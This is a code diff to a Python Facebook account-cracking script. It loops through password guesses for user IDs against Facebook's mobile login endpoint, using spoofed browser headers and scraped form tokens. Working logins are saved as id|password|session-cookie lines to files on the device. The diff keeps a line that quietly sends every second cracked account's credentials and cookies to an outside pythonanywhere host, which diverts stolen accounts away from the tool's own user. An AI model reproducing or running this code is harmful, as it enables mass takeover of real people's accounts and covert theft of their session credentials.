@@ -1691,115 +1691,133 @@ def d(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
-            nip=random.choice(xvx)
-            proxs= {'http': nip}
-            ua = random.choice(uas)
+            ua = 'Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/62.4.2254.61190|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
             Session = requests.Session()
-            free_fb = Session.get('https://touch.facebook.com/').text
-            data = {
-    "params": json.dumps({
-        "server_params": {
-            "credential_type": "password",
-            "username_text_input_id": "yzmero:69",
-            "password_text_input_id": "yzmero:70",
-            "login_source": "Login",
-            "login_credential_type": "none",
-            "server_login_source": "login",
-            "ar_event_source": "login_home_page",
-            "should_trigger_override_login_success_action": 0,
-            "should_trigger_override_login_2fa_action": 0,
-            "is_caa_perf_enabled": 0,
-            "reg_flow_source": "login_home_native_integration_point",
-            "caller": "gslr",
-            "is_from_landing_page": 0,
-            "is_from_empty_password": 0,
-            "is_from_password_entry_page": 0,
-            "is_from_assistive_id": 0,
-            "is_from_msplit_fallback": 0,
-            "INTERNALlatency_qpl_marker_id": 36707139,
-            "INTERNALlatency_qpl_instance_id": "211568211600414",
-            "device_id": None,
-            "family_device_id": None,
-            "waterfall_id": "9b12f14d-e937-4714-94bf-015a5d6b4db3",
-            "offline_experiment_group": None,
-            "layered_homepage_experiment_group": None,
-            "is_platform_login": 0,
-            "is_from_logged_in_switcher": 0,
-            "is_from_logged_out": 0,
-            "access_flow_version": "F2_FLOW"
-        },
-        "client_input_params": {
-            "machine_id": "",
-            "contact_point": uid,
-            "password": "#PWD_BROWSER:0:{}:{}".format(str(int(time.time())), pw),
-            "accounts_list": [],
-            "fb_ig_device_id": [],
-            "secure_family_device_id": "",
-            "encrypted_msisdn": "",
-            "headers_infra_flow_id": "",
-            "try_num": 1,
-            "login_attempt_count": 1,
-            "event_flow": "login_manual",
-            "event_step": "home_page",
-            "openid_tokens": {},
-            "auth_secure_device_id": "",
-            "client_known_key_hash": "",
-            "has_whatsapp_installed": 0,
-            "sso_token_map_json_string": "",
-            "should_show_nested_nta_from_aymh": 0,
-            "password_contains_non_ascii": "false",
-            "has_granted_read_contacts_permissions": 0,
-            "has_granted_read_phone_permissions": 0,
-            "app_manager_id": "",
-            "lois_settings": {
-                "lois_token": "",
-                "lara_override": ""
-            }
-        }
-    })
-}
-            data2 = {
-            '__aaid': '0',
-            '__user': '0',
-            '__a': '1',
-            '__req': 'f',
-            '__hs': '20058.BP:wbloks_caa_pkg.2.0..0.0',
-            'dpr': '3',
-            '__ccg': 'EXCELLENT',
-            '__rev': '1018538768',
-            '__s': '3o19vx:6unffp:0ifzbp',
-            '__hsi': '7443521229922239744',
-            '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13w9y1DxW0Oohw5ux60Vo1a852q1ew2io0D24o1MUaE1Do1u81x82ewnE3Mw4WwSyE25w8W0Lo6-1CwOw5jw4JwzK0zo3jw',
-            '__csr': '',
-            'fb_dtsg': 'NAcOlfpCOM2BFnghClV_Fbk2SejAMCvE1gYRFgP4Eh4s03fmjrbDwEA:0:0',
-            'jazoest': '24865',
-            'lsd': 'AVqsfW-tGqM',
-            'params': json.dumps(data),}
+            free_fb = Session.get('https://m.facebook.com/').text
+            cookies = {
+            'datr': 'eL_uZ2Ty3h0loiAu7Is5kJfa',
+            'sb': 'eL_uZ9ijCdro7wndMVgTyIBo',
+            'ps_l': '1',
+            'ps_n': '1',
+            'vpd': 'v1%3B754x393x2.75',
+            'locale': 'en_US',
+            'wl_cbv': 'v2%3Bclient_version%3A2839%3Btimestamp%3A1749279032',
+            'dpr': '3.0234789848327637',
+            'm_pixel_ratio': '2.75',
+            'wd': '393x895',
+            'fr': '1luwxyfC0S3PqSGOB.AWdHWSlIFgbTsyGIpb0ybBWJfd90ljXfeYezIDp1sNzBIA5oVJU.BoRC9Z..AAA.0.0.BoRDJU.AWcx--m4gr-h5rmVlUlEexIex9Y',}
             params = {
             'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
             'type': 'action',
-            '__bkv': 'c56d64e112aab0b91c09738dea6c1b1ae292869302e280ba3309ee28c8454654',}
+            '__bkv': 'e787cb1606ebe4cc6aaf5a1ce304f07c3da0663045060614c1cd6806596c46e6',}
+            data = {
+    '__aaid': '0',
+    '__user': '0',
+    '__a': '1',
+    '__req': 'a',
+    '__hs': '20246.BP:wbloks_caa_pkg.2.0...0',
+    'dpr': '3',
+    '__ccg': 'EXCELLENT',
+    '__rev': '1023608600',
+    '__s': ':f95eey:i9v0n0',
+    '__hsi': '7513185148771233093',
+    '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde',
+    'fb_dtsg': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+    'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+    'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+    'params': json.dumps({
+        "params": json.dumps({
+            "server_params": {
+                "credential_type": "password",
+                "username_text_input_id": "7w9omu:68",
+                "password_text_input_id": "7w9omu:69",
+                "login_source": "Login",
+                "login_credential_type": "none",
+                "server_login_source": "login",
+                "ar_event_source": "login_home_page",
+                "should_trigger_override_login_success_action": 0,
+                "should_trigger_override_login_2fa_action": 0,
+                "is_caa_perf_enabled": 0,
+                "reg_flow_source": "login_home_native_integration_point",
+                "caller": "gslr",
+                "is_from_landing_page": 0,
+                "is_from_empty_password": 0,
+                "is_from_aymh": 0,
+                "is_from_password_entry_page": 0,
+                "is_from_assistive_id": 0,
+                "is_from_msplit_fallback": 0,
+                "two_step_login_type": "one_step_login",
+                "INTERNAL__latency_qpl_marker_id": 36707139,
+                "INTERNAL__latency_qpl_instance_id": "47746277400427",
+                "device_id": None,
+                "family_device_id": None,
+                "waterfall_id": "123dc61e-79b8-44ee-8c3d-6da87a95cea7",
+                "offline_experiment_group": None,
+                "layered_homepage_experiment_group": None,
+                "is_platform_login": 0,
+                "is_from_logged_in_switcher": 0,
+                "is_from_logged_out": 0,
+                "access_flow_version": "pre_mt_behavior"
+            },
+            "client_input_params": {
+                "machine_id": "",
+                "cloud_trust_token": None,
+                "contact_point": uid,
+                "password": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
+                "accounts_list": [],
+                "fb_ig_device_id": [],
+                "secure_family_device_id": "",
+                "encrypted_msisdn": "",
+                "headers_infra_flow_id": "",
+                "try_num": 1,
+                "login_attempt_count": 1,
+                "event_flow": "login_manual",
+                "event_step": "home_page",
+                "openid_tokens": {},
+                "block_store_machine_id": "",
+                "auth_secure_device_id": "",
+                "client_known_key_hash": "",
+                "has_whatsapp_installed": 0,
+                "sso_token_map_json_string": "",
+                "should_show_nested_nta_from_aymh": 0,
+                "password_contains_non_ascii": "false",
+                "has_granted_read_contacts_permissions": 0,
+                "has_granted_read_phone_permissions": 0,
+                "app_manager_id": "",
+                "aymh_accounts": [],
+                "lois_settings": {
+                    "lois_token": ""
+                }
+            }
+        })
+    }),
+}
             headers = {
-            'authority': 'm.facebook.com',
-            'accept': '*/*',
-            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
-            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
-            'origin': 'https://m.facebook.com',
-            'referer': 'https://m.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzMyOTk2OTY2LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+            'Host': 'mtouch.facebook.com',
+            # 'content-length': str(len(str(data))), # Content-length is usually set by requests
+            'sec-ch-ua':  '"Chromium";v="137", "Not/A)Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-model': '"23076PC4BI"',
+            'user-agent': ____PO_CO____(), # Using the dynamic UA generator
+            'x-response-format': 'JSONStream',
+            'content-type': 'application/x-www-form-urlencoded',
+            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'viewport-width': '360',
+            'x-requested-with': 'XMLHttpRequest',
+            'x-asbd-id': '129477',
+            'dpr': '2',
+            'sec-ch-prefers-color-scheme': 'light',
             'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"14.0.0"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
+            'accept': '*/*',
+            'origin': 'https://mtouch.facebook.com',
             'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',}
+            'sec-fetch-mode': 'cors', # 'empty' in bytecode, 'cors' more typical for XHR
+            'sec-fetch-dest': 'empty',
+            'referer': 'https://mtouch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://mbasic.facebook.com/async/wbloks/fetch/"
-            po = Session.post(url, params=params, data=data2, headers=headers).text
+            url = "https://p.facebook.com/async/wbloks/fetch/"
+            po = Session.post(url, params=params, data=data, cookies=cookies, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
@@ -1807,21 +1825,16 @@ def d(uid,pwx,tl):
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
-                    if '%3A-1%3A-1' in coki:
-                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
-                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        break
+                    bkas.append(cid)
+                    if len(bkas)% 2 == 0:
+                        statusok = (f"{cid}|{pw}|{coki}")
+                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                     else:
-                        bkas.append(cid)
-                        if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                        else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
-                           break
+                        print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                        print(f" {green}Cookie : {green}{coki}")
+                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        oks.append(cid)
+                        break
                 else:
                     break
             elif 'checkpoint' in response:
